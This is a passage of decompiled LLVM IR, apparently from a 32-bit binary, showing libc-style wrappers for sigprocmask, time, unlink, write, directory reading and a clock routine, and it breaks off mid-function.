  %v1_804fdab = call i32 @function_8050089(i32 %v0_804fd97)
  %v0_804fdb0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fdb0 = sub i32 0, %v0_804fdb0
  %v2_804fdb2 = inttoptr i32 %v1_804fdab to i32*
  store i32 %v1_804fdb0, i32* %v2_804fdb2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fdbb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fdb7

dec_label_pc_804fdb7:                             ; preds = %dec_label_pc_804fd97, %dec_label_pc_804fdab
  %v2_804fdbb = phi i32 [ %v0_804fd97, %dec_label_pc_804fd97 ], [ %v2_804fdbb.pre, %dec_label_pc_804fdab ]
  %v0_804fdb7 = phi i32 [ %v1_804fda0, %dec_label_pc_804fd97 ], [ -1, %dec_label_pc_804fdab ]
  store i32 %v2_804fdbb, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fdb7

; uselistorder directives
  uselistorder i32 %v1_804fda0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdb7, { 1, 0 }
}

define i32 @function_804fdbd(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fdbd:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804fdbe = load i32, i32* @esi, align 4
  %v4_804fdc2 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fdc2, i32* @ecx, align 4
  %v2_804fdce = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804fdce, label %dec_label_pc_804fde7, label %dec_label_pc_804fdd2

dec_label_pc_804fdd2:                             ; preds = %dec_label_pc_804fdbd
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804fde7, label %dec_label_pc_804fdd7

dec_label_pc_804fdd7:                             ; preds = %dec_label_pc_804fdd2
  %v1_804fdd7 = call i32 @function_8050089(i32 %v0_804fdbe)
  %v1_804fddc = inttoptr i32 %v1_804fdd7 to i32*
  store i32 22, i32* %v1_804fddc, align 4
  br label %dec_label_pc_804fe0e

dec_label_pc_804fde7:                             ; preds = %dec_label_pc_804fdd2, %dec_label_pc_804fdbd
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804fdec = load i32, i32* @ebx, align 4
  %v7_804fdf4 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804fdec, i32* @ebx, align 4
  store i32 %v7_804fdf4, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804fdf4, -4095
  br i1 %tmp12, label %dec_label_pc_804fe0e, label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %dec_label_pc_804fde7
  %v1_804fe00 = call i32 @function_8050089(i32 %v0_804fdec)
  %v0_804fe05 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe05 = sub i32 0, %v0_804fe05
  %v2_804fe07 = inttoptr i32 %v1_804fe00 to i32*
  store i32 %v1_804fe05, i32* %v2_804fe07, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe0e

dec_label_pc_804fe0e:                             ; preds = %dec_label_pc_804fe00, %dec_label_pc_804fde7, %dec_label_pc_804fdd7
  %storemerge = phi i32 [ -1, %dec_label_pc_804fdd7 ], [ %v7_804fdf4, %dec_label_pc_804fde7 ], [ -1, %dec_label_pc_804fe00 ]
  %v2_804fe0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe0e, i32* @edx, align 4
  store i32 %v0_804fdbe, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804fdf4, { 1, 0, 2 }
  uselistorder i32 %v0_804fdec, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804fe12(i32* %arg1) local_unnamed_addr {
dec_label_pc_804fe12:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe12 = load i32, i32* @edi, align 4
  store i32 %v0_804fe12, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804fe1a = load i32, i32* @ebx, align 4
  %v2_804fe22 = call i32 @time(i32* %arg1)
  store i32 %v0_804fe1a, i32* @ebx, align 4
  store i32 %v2_804fe22, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_804fe22, -4095
  br i1 %tmp10, label %dec_label_pc_804fe3a, label %dec_label_pc_804fe2e

dec_label_pc_804fe2e:                             ; preds = %dec_label_pc_804fe12
  %v1_804fe2e = call i32 @function_8050089(i32 %v0_804fe1a)
  %v0_804fe33 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe33 = sub i32 0, %v0_804fe33
  %v2_804fe35 = inttoptr i32 %v1_804fe2e to i32*
  store i32 %v1_804fe33, i32* %v2_804fe35, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fe3e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fe3a

dec_label_pc_804fe3a:                             ; preds = %dec_label_pc_804fe12, %dec_label_pc_804fe2e
  %v2_804fe3e = phi i32 [ %v0_804fe12, %dec_label_pc_804fe12 ], [ %v2_804fe3e.pre, %dec_label_pc_804fe2e ]
  %v0_804fe3a = phi i32 [ %v2_804fe22, %dec_label_pc_804fe12 ], [ -1, %dec_label_pc_804fe2e ]
  %v2_804fe3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe3c, i32* @edx, align 4
  store i32 %v2_804fe3e, i32* @edi, align 4
  ret i32 %v0_804fe3a

; uselistorder directives
  uselistorder i32 %v2_804fe22, { 1, 0, 2 }
  uselistorder i32 %v0_804fe1a, { 1, 0 }
  uselistorder label %dec_label_pc_804fe3a, { 1, 0 }
}

define i32 @function_804fe40() local_unnamed_addr {
dec_label_pc_804fe40:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe40 = load i32, i32* @edi, align 4
  store i32 %v0_804fe40, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_804fe48 = load i32, i32* @ebx, align 4
  %v1_804fe49 = inttoptr i32 %tmp to i8*
  %v3_804fe50 = call i32 @unlink(i8* %v1_804fe49)
  store i32 %v0_804fe48, i32* @ebx, align 4
  store i32 %v3_804fe50, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804fe50, -4095
  br i1 %tmp9, label %dec_label_pc_804fe68, label %dec_label_pc_804fe5c

dec_label_pc_804fe5c:                             ; preds = %dec_label_pc_804fe40
  %v1_804fe5c = call i32 @function_8050089(i32 %v0_804fe48)
  %v0_804fe61 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe61 = sub i32 0, %v0_804fe61
  %v2_804fe63 = inttoptr i32 %v1_804fe5c to i32*
  store i32 %v1_804fe61, i32* %v2_804fe63, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fe6c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fe68

dec_label_pc_804fe68:                             ; preds = %dec_label_pc_804fe40, %dec_label_pc_804fe5c
  %v2_804fe6c = phi i32 [ %v0_804fe40, %dec_label_pc_804fe40 ], [ %v2_804fe6c.pre, %dec_label_pc_804fe5c ]
  %v0_804fe68 = phi i32 [ %v3_804fe50, %dec_label_pc_804fe40 ], [ -1, %dec_label_pc_804fe5c ]
  store i32 %v2_804fe6c, i32* @edi, align 4
  ret i32 %v0_804fe68

; uselistorder directives
  uselistorder i32 %v3_804fe50, { 1, 0, 2 }
  uselistorder i32 %v0_804fe48, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804fe68, { 1, 0 }
}

define i32 @function_804fe6e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fe6e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe6e = load i32, i32* @edi, align 4
  store i32 %v0_804fe6e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fe7e = load i32, i32* @ebx, align 4
  %v4_804fe86 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804fe86, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fe86, -4095
  br i1 %tmp12, label %dec_label_pc_804fe9e, label %dec_label_pc_804fe92

dec_label_pc_804fe92:                             ; preds = %dec_label_pc_804fe6e
  %v1_804fe92 = call i32 @function_8050089(i32 %v0_804fe7e)
  %v0_804fe97 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe97 = sub i32 0, %v0_804fe97
  %v2_804fe99 = inttoptr i32 %v1_804fe92 to i32*
  store i32 %v1_804fe97, i32* %v2_804fe99, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fea2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fe9e

dec_label_pc_804fe9e:                             ; preds = %dec_label_pc_804fe6e, %dec_label_pc_804fe92
  %v2_804fea2 = phi i32 [ %v0_804fe6e, %dec_label_pc_804fe6e ], [ %v2_804fea2.pre, %dec_label_pc_804fe92 ]
  %v0_804fe9e = phi i32 [ %v4_804fe86, %dec_label_pc_804fe6e ], [ -1, %dec_label_pc_804fe92 ]
  store i32 %v2_804fea2, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fe9e

; uselistorder directives
  uselistorder i32 %v4_804fe86, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fe9e, { 1, 0 }
}

define i32 @function_804fea4() local_unnamed_addr {
dec_label_pc_804fea4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_804fea4 = load i32, i32* @edi, align 4
  %v0_804fea5 = load i32, i32* @esi, align 4
  %v0_804fea6 = load i32, i32* @ebx, align 4
  %v12_804fea7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_804feae = inttoptr i32 %tmp to i32*
  %v2_804feae = load i32, i32* %v1_804feae, align 4
  %v12_804feae = icmp eq i32 %v2_804feae, -1
  %v1_804feb1 = icmp eq i1 %v12_804feae, false
  br i1 %v1_804feb1, label %dec_label_pc_804fec3, label %dec_label_pc_804feb3

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fea4
  %v1_804feb3 = call i32 @function_8050089(i32 %v0_804fea6)
  %v1_804feb8 = inttoptr i32 %v1_804feb3 to i32*
  store i32 9, i32* %v1_804feb8, align 4
  br label %dec_label_pc_804ff0d

dec_label_pc_804fec3:                             ; preds = %dec_label_pc_804fea4
  %v1_804fec3 = add i32 %tmp, 24
  store i32 %v12_804fea7, i32* @esi, align 4
  %v2_804fed2 = call i32 @function_8051a10(i32 %v12_804fea7, i32 134552077)
  %v1_804feda = call i32 @function_8051a0d(i32 %v1_804fec3)
  store i32 %v1_804feda, i32* @eax, align 4
  %v0_804fedf = load i32, i32* @edi, align 4
  %v1_804fedf = inttoptr i32 %v0_804fedf to i32*
  %v2_804fedf = load i32, i32* %v1_804fedf, align 4
  store i32 %v2_804fedf, i32* @ebx, align 4
  store i32 -1, i32* %v1_804fedf, align 4
  %v2_804feec = call i32 @function_8051a10(i32 %v12_804fea7, i32 1)
  %v0_804fef2 = load i32, i32* @edi, align 4
  %v1_804fef2 = add i32 %v0_804fef2, 12
  %v2_804fef2 = inttoptr i32 %v1_804fef2 to i32*
  %v3_804fef2 = load i32, i32* %v2_804fef2, align 4
  %v1_804fef5 = call i32 @function_80512a9(i32 %v3_804fef2)
  %v0_804fefa = load i32, i32* @edi, align 4
  %v1_804fefd = call i32 @function_80512a9(i32 %v0_804fefa)
  %v0_804ff02 = load i32, i32* @ebx, align 4
  %v1_804ff05 = call i32 @function_804fb51(i32 %v0_804ff02)
  br label %dec_label_pc_804ff0d

dec_label_pc_804ff0d:                             ; preds = %dec_label_pc_804feb3, %dec_label_pc_804fec3
  %v0_804ff13 = phi i32 [ -1, %dec_label_pc_804feb3 ], [ %v1_804ff05, %dec_label_pc_804fec3 ]
  store i32 %v0_804fea6, i32* @ebx, align 4
  store i32 %v0_804fea5, i32* @esi, align 4
  store i32 %v0_804fea4, i32* @edi, align 4
  ret i32 %v0_804ff13

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ff0d, { 1, 0 }
}

define i32 @function_804ff14(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ff14:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ff14 = load i32, i32* @edi, align 4
  %v0_804ff16 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff16, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_804ff25 = inttoptr i32 %arg1 to i8*
  %v3_804ff25 = call i32 @function_804fc62(i8* %v2_804ff25, i32 67584)
  store i32 %v3_804ff25, i32* %eax.global-to-local, align 4
  store i32 %v3_804ff25, i32* @edi, align 4
  %v2_804ff2f = icmp slt i32 %v3_804ff25, 0
  br i1 %v2_804ff2f, label %dec_label_pc_804fffc, label %dec_label_pc_804ff37

dec_label_pc_804ff37:                             ; preds = %dec_label_pc_804ff14
  %v0_804ff37 = load i32, i32* @ebx, align 4
  %v2_804ff39 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_804ff39, i32* %eax.global-to-local, align 4
  store i32 %v3_804ff25, i32* %stack_var_-124, align 4
  %v4_804ff3f = call i32 @function_8051e0a(i32 %v3_804ff25, i32 %v2_804ff39, i32 %v0_804ff37, i32 %v0_804ff37)
  store i32 %v4_804ff3f, i32* %eax.global-to-local, align 4
  %v2_804ff47 = icmp slt i32 %v4_804ff3f, 0
  br i1 %v2_804ff47, label %dec_label_pc_804ff5d, label %dec_label_pc_804ff4b

dec_label_pc_804ff4b:                             ; preds = %dec_label_pc_804ff37
  %v0_804ff50 = load i32, i32* @edi, align 4
  store i32 %v0_804ff50, i32* %stack_var_-124, align 4
  %v3_804ff51 = call i32 @function_804fa8d(i32 %v0_804ff50, i32 2, i32 1)
  store i32 %v3_804ff51, i32* %eax.global-to-local, align 4
  %v2_804ff59 = icmp slt i32 %v3_804ff51, 0
  %v1_804ff5b = icmp eq i1 %v2_804ff59, false
  br i1 %v1_804ff5b, label %dec_label_pc_804ff73, label %dec_label_pc_804ff5d

dec_label_pc_804ff5d:                             ; preds = %dec_label_pc_804ff4b, %dec_label_pc_804ff37
  %v0_804ff5d = load i32, i32* %stack_var_-124, align 4
  %v1_804ff5d = call i32 @function_8050089(i32 %v0_804ff5d)
  store i32 %v1_804ff5d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ff5d, i32* @ebx, align 4
  %v1_804ff67 = inttoptr i32 %v1_804ff5d to i32*
  %v2_804ff67 = load i32, i32* %v1_804ff67, align 4
  %v0_804ff69 = load i32, i32* @edi, align 4
  store i32 %v0_804ff69, i32* %stack_var_-124, align 4
  %v1_804ff6a = call i32 @function_804fb51(i32 %v0_804ff69)
  store i32 %v1_804ff6a, i32* %eax.global-to-local, align 4
  %v1_804ff6f = load i32, i32* @ebx, align 4
  %v2_804ff6f = inttoptr i32 %v1_804ff6f to i32*
  store i32 %v2_804ff67, i32* %v2_804ff6f, align 4
  br label %dec_label_pc_804ffe8

dec_label_pc_804ff73:                             ; preds = %dec_label_pc_804ff4b
  store i32 48, i32* %stack_var_-124, align 4
  %v1_804ff78 = call i32 @function_80504e4(i32 48)
  store i32 %v1_804ff78, i32* %eax.global-to-local, align 4
  store i32 %v1_804ff78, i32* @ebx, align 4
  %v1_804ff82 = icmp eq i32 %v1_804ff78, 0
  br i1 %v1_804ff82, label %dec_label_pc_804ffd4, label %dec_label_pc_804ff86

dec_label_pc_804ff86:                             ; preds = %dec_label_pc_804ff73
  %v0_804ff86 = load i32, i32* @edi, align 4
  %v2_804ff86 = inttoptr i32 %v1_804ff78 to i32*
  store i32 %v0_804ff86, i32* %v2_804ff86, align 4
  %v1_804ff88 = add i32 %v1_804ff78, 16
  %v2_804ff88 = inttoptr i32 %v1_804ff88 to i32*
  store i32 0, i32* %v2_804ff88, align 4
  %v1_804ff8f = add i32 %v1_804ff78, 8
  %v2_804ff8f = inttoptr i32 %v1_804ff8f to i32*
  store i32 0, i32* %v2_804ff8f, align 4
  %v1_804ff96 = add i32 %v1_804ff78, 4
  %v2_804ff96 = inttoptr i32 %v1_804ff96 to i32*
  store i32 0, i32* %v2_804ff96, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_804ffa1 = load i32, i32* @ebx, align 4
  %v2_804ffa1 = add i32 %v1_804ffa1, 20
  %v3_804ffa1 = inttoptr i32 %v2_804ffa1 to i32*
  store i32 %tmp, i32* %v3_804ffa1, align 4
  %v0_804ffa4 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ffa9 = icmp ugt i32 %v0_804ffa4, 511
  br i1 %v6_804ffa9, label %dec_label_pc_804ffb2, label %dec_label_pc_804ffab

dec_label_pc_804ffab:                             ; preds = %dec_label_pc_804ff86
  %v0_804ffab = load i32, i32* @ebx, align 4
  %v1_804ffab = add i32 %v0_804ffab, 20
  %v2_804ffab = inttoptr i32 %v1_804ffab to i32*
  store i32 512, i32* %v2_804ffab, align 4
  br label %dec_label_pc_804ffb2

dec_label_pc_804ffb2:                             ; preds = %dec_label_pc_804ff86, %dec_label_pc_804ffab
  %v0_804ffb4 = load i32, i32* @ebx, align 4
  %v1_804ffb4 = add i32 %v0_804ffb4, 20
  %v2_804ffb4 = inttoptr i32 %v1_804ffb4 to i32*
  %v3_804ffb4 = load i32, i32* %v2_804ffb4, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_804ffb9 = call i32 @function_8050c58(i64 1, i32 %v3_804ffb4)
  store i32 %v3_804ffb9, i32* %eax.global-to-local, align 4
  %v1_804ffc1 = load i32, i32* @ebx, align 4
  %v2_804ffc1 = add i32 %v1_804ffc1, 12
  %v3_804ffc1 = inttoptr i32 %v2_804ffc1 to i32*
  store i32 %v3_804ffb9, i32* %v3_804ffc1, align 4
  %v1_804ffc4 = icmp eq i32 %v3_804ffb9, 0
  %v1_804ffc6 = icmp eq i1 %v1_804ffc4, false
  br i1 %v1_804ffc6, label %dec_label_pc_804ffec, label %dec_label_pc_804ffc8

dec_label_pc_804ffc8:                             ; preds = %dec_label_pc_804ffb2
  %v0_804ffcb = load i32, i32* @ebx, align 4
  store i32 %v0_804ffcb, i32* %stack_var_-124, align 4
  %v1_804ffcc = call i32 @function_80512a9(i32 %v0_804ffcb)
  store i32 %v1_804ffcc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ffd4

dec_label_pc_804ffd4:                             ; preds = %dec_label_pc_804ff73, %dec_label_pc_804ffc8
  %v0_804ffd7 = load i32, i32* @edi, align 4
  store i32 %v0_804ffd7, i32* %stack_var_-124, align 4
  %v1_804ffd8 = call i32 @function_804fb51(i32 %v0_804ffd7)
  store i32 %v1_804ffd8, i32* %eax.global-to-local, align 4
  %v1_804ffdd = call i32 @function_8050089(i32 %v0_804ffd7)
  store i32 %v1_804ffdd, i32* %eax.global-to-local, align 4
  %v1_804ffe2 = inttoptr i32 %v1_804ffdd to i32*
  store i32 12, i32* %v1_804ffe2, align 4
  br label %dec_label_pc_804ffe8

dec_label_pc_804ffe8:                             ; preds = %dec_label_pc_804ff5d, %dec_label_pc_804ffd4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804fff9

dec_label_pc_804ffec:                             ; preds = %dec_label_pc_804ffb2
  %v0_804ffee = load i32, i32* @ebx, align 4
  %v1_804ffee = add i32 %v0_804ffee, 24
  store i32 %v1_804ffee, i32* %eax.global-to-local, align 4
  store i32 %v1_804ffee, i32* %stack_var_-124, align 4
  %v1_804fff4 = call i32 @function_8051a0d(i32 %v1_804ffee)
  store i32 %v1_804fff4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fff9

dec_label_pc_804fff9:                             ; preds = %dec_label_pc_804ffe8, %dec_label_pc_804ffec
  %v2_8050001.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804fffc

dec_label_pc_804fffc:                             ; preds = %dec_label_pc_804ff14, %dec_label_pc_804fff9
  %v2_8050001 = phi i32 [ %v0_804ff16, %dec_label_pc_804ff14 ], [ %v2_8050001.pre, %dec_label_pc_804fff9 ]
  %v0_804ffff = load i32, i32* @ebx, align 4
  store i32 %v0_804ffff, i32* %eax.global-to-local, align 4
  store i32 %v2_8050001, i32* @ebx, align 4
  store i32 %v0_804ff14, i32* @edi, align 4
  ret i32 %v0_804ffff

; uselistorder directives
  uselistorder i32 %v3_804ffb9, { 1, 0, 2 }
  uselistorder i32 %v1_804ff78, { 2, 3, 5, 4, 1, 0, 6 }
  uselistorder i32 %v1_804ff5d, { 1, 0, 2 }
  uselistorder i32 %v3_804ff25, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_8050c58, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_804fb51, { 11, 10, 5, 15, 14, 13, 12, 4, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fffc, { 1, 0 }
  uselistorder label %dec_label_pc_804fff9, { 1, 0 }
  uselistorder label %dec_label_pc_804ffe8, { 1, 0 }
  uselistorder label %dec_label_pc_804ffd4, { 1, 0 }
  uselistorder label %dec_label_pc_804ffb2, { 1, 0 }
}

define i32 @function_8050005() local_unnamed_addr {
dec_label_pc_8050005:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050005 = load i32, i32* @esi, align 4
  %v0_8050006 = load i32, i32* @ebx, align 4
  store i32 %v0_8050006, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_805000e = add i32 %tmp, 24
  store i32 %v1_805000e, i32* @ebx, align 4
  %v2_8050017 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050017, i32* @eax, align 4
  %v2_805001c = call i32 @function_8051a10(i32 %v2_8050017, i32 134552077)
  %v0_8050021 = load i32, i32* @ebx, align 4
  %v1_8050024 = call i32 @function_8051a0d(i32 %v0_8050021)
  br label %dec_label_pc_805002c

dec_label_pc_805002c:                             ; preds = %dec_label_pc_8050057, %dec_label_pc_8050005
  %v0_805002c = load i32, i32* @esi, align 4
  %v1_805002c = add i32 %v0_805002c, 8
  %v2_805002c = inttoptr i32 %v1_805002c to i32*
  %v3_805002c = load i32, i32* %v2_805002c, align 4
  %v2_805002f = add i32 %v0_805002c, 4
  %v3_805002f = inttoptr i32 %v2_805002f to i32*
  %v4_805002f = load i32, i32* %v3_805002f, align 4
  %v6_8050032 = icmp ugt i32 %v3_805002c, %v4_805002f
  br i1 %v6_8050032, label %dec_label_pc_8050057, label %dec_label_pc_8050034

dec_label_pc_8050034:                             ; preds = %dec_label_pc_805002c
  %v0_8050034 = load i32, i32* @edx, align 4
  %v1_8050035 = add i32 %v0_805002c, 20
  %v2_8050035 = inttoptr i32 %v1_8050035 to i32*
  %v3_8050035 = load i32, i32* %v2_8050035, align 4
  %v1_8050038 = add i32 %v0_805002c, 12
  %v2_8050038 = inttoptr i32 %v1_8050038 to i32*
  %v3_8050038 = load i32, i32* %v2_8050038, align 4
  %v1_805003b = inttoptr i32 %v0_805002c to i32*
  %v2_805003b = load i32, i32* %v1_805003b, align 4
  %v4_805003d = call i32 @function_8051e52(i32 %v2_805003b, i32 %v3_8050038, i32 %v3_8050035, i32 %v0_8050034)
  %tmp12 = icmp slt i32 %v4_805003d, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_805004d, label %dec_label_pc_8050049

dec_label_pc_8050049:                             ; preds = %dec_label_pc_8050034
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050073

dec_label_pc_805004d:                             ; preds = %dec_label_pc_8050034
  %v1_805004d = load i32, i32* @esi, align 4
  %v2_805004d = add i32 %v1_805004d, 8
  %v3_805004d = inttoptr i32 %v2_805004d to i32*
  store i32 %v4_805003d, i32* %v3_805004d, align 4
  %v0_8050050 = load i32, i32* @esi, align 4
  %v1_8050050 = add i32 %v0_8050050, 4
  %v2_8050050 = inttoptr i32 %v1_8050050 to i32*
  store i32 0, i32* %v2_8050050, align 4
  %v0_8050057.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050057

dec_label_pc_8050057:                             ; preds = %dec_label_pc_805002c, %dec_label_pc_805004d
  %v1_8050065 = phi i32 [ %v0_805002c, %dec_label_pc_805002c ], [ %v0_8050057.pre, %dec_label_pc_805004d ]
  %v1_8050057 = add i32 %v1_8050065, 4
  %v2_8050057 = inttoptr i32 %v1_8050057 to i32*
  %v3_8050057 = load i32, i32* %v2_8050057, align 4
  %v2_805005c = add i32 %v1_8050065, 12
  %v3_805005c = inttoptr i32 %v2_805005c to i32*
  %v4_805005c = load i32, i32* %v3_805005c, align 4
  %v5_805005c = add i32 %v4_805005c, %v3_8050057
  store i32 %v5_805005c, i32* @ebx, align 4
  %v1_805005f = add i32 %v5_805005c, 8
  %v2_805005f = inttoptr i32 %v1_805005f to i16*
  %v3_805005f = load i16, i16* %v2_805005f, align 2
  %v4_805005f = zext i16 %v3_805005f to i32
  store i32 %v4_805005f, i32* @edx, align 4
  %v2_8050063 = add i32 %v4_805005f, %v3_8050057
  store i32 %v2_8050063, i32* %v2_8050057, align 4
  %v0_8050068 = load i32, i32* @ebx, align 4
  %v1_8050068 = add i32 %v0_8050068, 4
  %v2_8050068 = inttoptr i32 %v1_8050068 to i32*
  %v3_8050068 = load i32, i32* %v2_8050068, align 4
  %v1_805006b = load i32, i32* @esi, align 4
  %v2_805006b = add i32 %v1_805006b, 16
  %v3_805006b = inttoptr i32 %v2_805006b to i32*
  store i32 %v3_8050068, i32* %v3_805006b, align 4
  %v0_805006e = load i32, i32* @ebx, align 4
  %v1_805006e = inttoptr i32 %v0_805006e to i32*
  %v2_805006e = load i32, i32* %v1_805006e, align 4
  %v3_805006e = icmp eq i32 %v2_805006e, 0
  br i1 %v3_805006e, label %dec_label_pc_805002c, label %dec_label_pc_8050073.loopexit

dec_label_pc_8050073.loopexit:                    ; preds = %dec_label_pc_8050057
  br label %dec_label_pc_8050073

dec_label_pc_8050073:                             ; preds = %dec_label_pc_8050073.loopexit, %dec_label_pc_8050049
  store i32 %v2_8050017, i32* @eax, align 4
  %v2_805007c = call i32 @function_8051a10(i32 %v2_8050017, i32 1)
  %v0_8050081 = load i32, i32* @ebx, align 4
  %v2_8050086 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050086, i32* @ebx, align 4
  store i32 %v0_8050005, i32* @esi, align 4
  ret i32 %v0_8050081

; uselistorder directives
  uselistorder i32 %v1_8050065, { 1, 0 }
  uselistorder i32 %v0_805002c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8050057, { 1, 0 }
}

define i32 @function_8050089(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050089:
  ret i32 ptrtoint (i32* @global_var_80530fc.185 to i32)
}

define i32 @function_805008f() local_unnamed_addr {
dec_label_pc_805008f:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v1_8050097 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8050097 = call i32 @function_8052227(%tms* %v1_8050097)
  %v4_805009c = trunc i64 %tmp to i32
  %v4_80500a0 = load i32, i32* %stack_var_-16, align 4
  %v5_80500a0 = add i32 %v4_80500a0, %v4_805009c
  %v3_80500a7 = mul i32 %v5_80500a0, 10000
  %v1_80500ad = and i32 %v3_80500a7, 2147483632
  ret i32 %v1_80500ad

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80500b3(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80500b3:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80500b4 = load i32, i32* @esi, align 4
  store i32 %v0_80500b4, i32* %stack_var_-8, align 4
  %v4_80500b5 = ptrtoint i8* %arg1 to i32
  %v9_80500c1 = icmp ugt i8* %tmp3, %arg1
  %v1_80500c3 = icmp eq i1 %v9_80500c1, false
  br i1 %v1_80500c3, label %dec_label_pc_80500cb, label %dec_label_pc_80500c5

dec_label_pc_80500c5:                             ; preds = %dec_label_pc_80500b3
  %v7_80500c7 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_80500d7

dec_label_pc_80500cb:                             ; preds = %dec_label_pc_80500b3
